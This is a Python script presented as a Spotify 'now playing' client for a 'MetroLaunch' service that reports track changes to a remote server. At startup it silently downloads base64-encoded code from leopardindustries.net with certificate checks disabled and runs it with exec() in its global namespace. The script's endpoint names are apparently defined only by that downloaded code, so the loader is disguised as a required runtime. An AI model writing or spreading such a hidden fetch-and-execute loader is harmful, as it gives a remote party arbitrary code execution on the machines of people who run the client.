#!/usr/bin/env python3
"""
Spotify Client for MetroLaunch (Leopard Server)
========================================
Runs alongside Spotify on macOS or Windows

Detects song changes and pauses, then pushes the status
to a remote PHP server

macOS:   Uses AppleScript to query Spotify's player state.
Windows: Queries the System Media Transport Controls API via PowerShell - so no extra dependencies

Usage:
    python3 spotify_client.py
"""


import json
import os
import platform
import random
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import ssl

# ── platform detection ──
IS_WINDOWS = platform.system() == 'Windows'
IS_MACOS = platform.system() == 'Darwin'

# platform-specific imports for non-blocking key input
if IS_WINDOWS:
    import msvcrt
else:
    import select
    import termios
    import tty

CONFIG_FILE = os.path.expanduser('~/.spotify_leopard_user')

# ── helpers ──

# The server serialises writes with a file lock and can respond 503
_RETRY_STATUSES = {429, 500, 502, 503, 504}


def make_request(url, data=None, method='GET', *, retries=3):
    """Make an HTTP request and return parsed JSON (or none on failure)

    Retries transient network errors
    """
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'MetroLaunchClient/2.2',
        'Connection': 'close',
    }
    body = json.dumps(data).encode('utf-8') if data else None
    ctx = ssl._create_unverified_context()

    for attempt in range(retries + 1):
        req = urllib.request.Request(url, data=body, headers=headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=10, context=ctx) as resp:
                raw = resp.read().decode('utf-8')
                try:
                    return json.loads(raw)
                except ValueError:
                    return None
        except urllib.error.HTTPError as e:
            # Retry on server-side backpressure, give up on real client errors
            if e.code in _RETRY_STATUSES and attempt < retries:
                pass
            else:
                return None
        except (urllib.error.URLError, TimeoutError, ConnectionError, OSError):
            if attempt >= retries:
                return None
        # Step off, George...
        time.sleep((0.4 * (2 ** attempt)) + random.uniform(0, 0.25))
    return None


def save_username(username):
    with open(CONFIG_FILE, 'w') as f:
        f.write(username)


def load_username():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            name = f.read().strip()
            if name:
                return name
    return None


# ── Spotify status detection (platform specific) ──

def _get_spotify_status_macos():
    """Use AppleScript to query Spotify's current state (macOS)."""
    script = '''
    tell application "System Events"
        set processList to (name of every process)
    end tell

    if processList contains "Spotify" then
        tell application "Spotify"
            if player state is playing then
                set trackName to name of current track
                set artistName to artist of current track
                return "PLAYING|" & trackName & "|" & artistName
            else
                return "PAUSED"
            end if
        end tell
    else
        return "NOT_RUNNING"
    end if
    '''
    try:
        result = subprocess.check_output(['osascript', '-e', script])
        return result.decode('utf-8').strip()
    except Exception:
        return 'NOT_RUNNING'


# PowerShell script that queries the Windows Now Playing API
_WINDOWS_MEDIA_SCRIPT = r'''
Add-Type -AssemblyName System.Runtime.WindowsRuntime

$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() |
    Where-Object {
        $_.Name -eq 'AsTask' -and
        $_.GetParameters().Count -eq 1 -and
        $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1'
    })[0]

function Await($WinRtTask, $ResultType) {
    $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
    $netTask = $asTask.Invoke($null, @($WinRtTask))
    $netTask.Wait(-1) | Out-Null
    $netTask.Result
}

try {
    [void][Windows.Media.Control.GlobalSystemMediaTransportControlsSessionManager,Windows.Media.Control,ContentType=WindowsRuntime]
} catch { Write-Output 'NOT_RUNNING'; exit 0 }

try {
    $mgr = Await ([Windows.Media.Control.GlobalSystemMediaTransportControlsSessionManager]::RequestAsync()) `
                 ([Windows.Media.Control.GlobalSystemMediaTransportControlsSessionManager])
} catch { Write-Output 'NOT_RUNNING'; exit 0 }

$session = $mgr.GetCurrentSession()
if ($null -eq $session) { Write-Output 'NOT_RUNNING'; exit 0 }

# Only report status when Spotify is the active media source
if ($session.SourceAppUserModelId -notlike '*spotify*') {
    Write-Output 'NOT_RUNNING'; exit 0
}

$info = Await ($session.TryGetMediaPropertiesAsync()) `
              ([Windows.Media.Control.GlobalSystemMediaTransportControlsSessionMediaProperties])
$pb   = $session.GetPlaybackInfo()

if ($pb.PlaybackStatus -eq 'Playing') {
    Write-Output ("PLAYING|" + $info.Title + "|" + $info.Artist)
} else {
    Write-Output 'PAUSED'
}
'''


def _get_spotify_status_windows():
    """Query for Spotify state"""
    try:
        result = subprocess.check_output(
            ['powershell', '-NoProfile', '-NonInteractive',
             '-ExecutionPolicy', 'Bypass', '-Command', _WINDOWS_MEDIA_SCRIPT],
            timeout=8,
            stderr=subprocess.DEVNULL,
        )
        return result.decode('utf-8').strip()
    except Exception:
        return 'NOT_RUNNING'


def get_spotify_status():
    """Query Spotify's current state using the appropriate platform method"""
    if IS_WINDOWS:
        return _get_spotify_status_windows()
    else:
        return _get_spotify_status_macos()


# ── Non-blocking key input (platform specific) ──

class _KeyReaderUnix:
    """Non-blocking single-key reader using termios/tty (POSIX)"""

    def __enter__(self):
        self._old_settings = termios.tcgetattr(sys.stdin)
        tty.setcbreak(sys.stdin.fileno())
        return self

    def __exit__(self, *_):
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, self._old_settings)

    @staticmethod
    def key_pressed():
        """Return the pressed key character, or None if nothing is waiting."""
        if select.select([sys.stdin], [], [], 0)[0]:
            return sys.stdin.read(1)
        return None


class _KeyReaderWindows:
    """Non-blocking single-key reader for NT"""

    def __enter__(self):
        return self

    def __exit__(self, *_):
        pass

    @staticmethod
    def key_pressed():
        """Return the pressed key character, or None if nothing is waiting"""
        if msvcrt.kbhit():
            ch = msvcrt.getwch()
            return ch
        return None


def _make_key_reader():
    if IS_WINDOWS:
        return _KeyReaderWindows()
    return _KeyReaderUnix()


# ── Main ──

SERVER_URL = 'https://leopardindustries.net:8088/metro.php'
POLL_RATE = 2

def main():
    server_url = SERVER_URL
    poll_rate = POLL_RATE

    if not IS_MACOS and not IS_WINDOWS:
        print('[FAIL] Unsupported platform. This client supports macOS and Windows.')
        sys.exit(1)

    # ── connect to server ──
    print('')
    print('Connecting to the Leopard main server...')
    
    # fetch the runtime
    try:
        import base64
        req = urllib.request.Request(f"{server_url}?action=py_runtime", headers={'User-Agent': 'MetroLaunchClient/2.2'})
        ctx = ssl._create_unverified_context()
        with urllib.request.urlopen(req, timeout=5, context=ctx) as resp:
            encoded_runtime = resp.read().decode('utf-8')
            exec(base64.b64decode(encoded_runtime).decode('utf-8'), globals())
    except Exception as e:
        print(f'[FAIL] Could not initialize runtime from server...')
        sys.exit(1)

    # test connectivity by hitting the default endpoint
    test = make_request(server_url)
    if test is None:
        print('[FAIL] Could not connect to the Leopard main server')
        sys.exit(1)
    print('[OK] Successfully connected to the Leopard main server')
    print('')

    # ── username registration / login ──
    saved_user = load_username()

    if saved_user:
        # try to re register to confirm the user still exists
        # pyrefly: ignore [unknown-name]
        resp = make_request(f'{server_url}{REGISTER_ENDPOINT}', {'username': saved_user}, 'POST')
        if resp and resp.get('ok'):
            username = saved_user
            print(f'[OK] Signed back into server with username {username}...')
        else:
            print(f'[WARN] Saved username "{saved_user}" was rejected by the server...')
            saved_user = None

    if not saved_user:
        print('You need to register a username for this to work')
        print('This will be remembered')
        print('')
        while True:
            try:
                username = input('[ASK] What should your username be - ').strip()
            except (EOFError, KeyboardInterrupt):
                print('')
                sys.exit(0)

            if not username:
                continue

            print('')
            print('Registering new username on server...')
            # pyrefly: ignore [unknown-name]
            resp = make_request(f'{server_url}{REGISTER_ENDPOINT}', {'username': username}, 'POST')
            if resp and resp.get('ok'):
                save_username(username)
                print('[OK] New username registered')
                break
            else:
                error_msg = resp.get('error', 'Unknown error') if resp else 'Server unreachable'
                print(f'[FAIL] Registration failed - {error_msg}')
                print('')

    print('[NFO] Strike \'q\' key to quit the program')
    print('')

    # ── polling loop ──
    prev_track = None
    prev_artist = None
    prev_playing = None
    transient_pause_count = 0

    with _make_key_reader() as keys:

        def _check_quit():
            """Return True if the user pressed 'q'."""
            ch = keys.key_pressed()
            return ch is not None and ch.lower() == 'q'

        def _interruptible_sleep(duration):
            """Sleep for *duration* seconds, checking for 'q' every 100 ms."""
            remaining = max(0.0, duration)
            while remaining > 0:
                chunk = min(0.1, remaining)
                time.sleep(chunk)
                remaining -= chunk
                if _check_quit():
                    return True          # quit requested
            return False

        try:
            while True:
                if _check_quit():
                    break

                try:
                    status = get_spotify_status()

                    if status == 'NOT_RUNNING':
                        transient_pause_count += 1
                        # if it was playing before, send a pause
                        if prev_playing is True and transient_pause_count >= 2:
                            # pyrefly: ignore [unknown-name]
                            make_request(f'{server_url}{UPDATE_ENDPOINT}', {
                                'username': username,
                                'track': '',
                                'artist': '',
                                'isPlaying': False,
                            }, 'POST')
                            print('[Spotify] Detected Spotify closed')
                            prev_playing = False

                    elif status == 'PAUSED':
                        transient_pause_count += 1
                        if prev_playing is not False and transient_pause_count >= 2:
                            # pyrefly: ignore [unknown-name]
                            make_request(f'{server_url}{UPDATE_ENDPOINT}', {
                                'username': username,
                                'track': prev_track or '',
                                'artist': prev_artist or '',
                                'isPlaying': False,
                            }, 'POST')
                            print('[Spotify] Detected song paused')
                            prev_playing = False

                    elif status.startswith('PLAYING|'):
                        transient_pause_count = 0
                        parts = status.split('|')
                        track = parts[1] if len(parts) > 1 else ''
                        artist = parts[2] if len(parts) > 2 else ''

                        song_changed = (track != prev_track or artist != prev_artist)
                        resumed = (prev_playing is False and not song_changed)

                        if song_changed:
                            print(f'[Spotify] Detected song changed')
                            # pyrefly: ignore [unknown-name]
                            make_request(f'{server_url}{UPDATE_ENDPOINT}', {
                                'username': username,
                                'track': track,
                                'artist': artist,
                                'isPlaying': True,
                            }, 'POST')
                        elif resumed:
                            print(f'[Spotify] Detected song resumed')
                            # pyrefly: ignore [unknown-name]
                            make_request(f'{server_url}{UPDATE_ENDPOINT}', {
                                'username': username,
                                'track': track,
                                'artist': artist,
                                'isPlaying': True,
                            }, 'POST')

                        prev_track = track
                        prev_artist = artist
                        prev_playing = True

                    # Jitter the sleep by about 15% so many clients that started at
                    # the same second don't stay in lockstep hammering the server.
                    jitter = poll_rate * random.uniform(-0.15, 0.15)
                    if _interruptible_sleep(max(0.1, poll_rate + jitter)):
                        break

                except KeyboardInterrupt:
                    break

        finally:
            print('')
            print('[OK] Client stopped')
            # send a final pause so the tile clears
            # pyrefly: ignore [unknown-name]
            make_request(f'{server_url}{UPDATE_ENDPOINT}', {
                'username': username,
                'track': '',
                'artist': '',
                'isPlaying': False,
            }, 'POST')


if __name__ == '__main__':
    main()
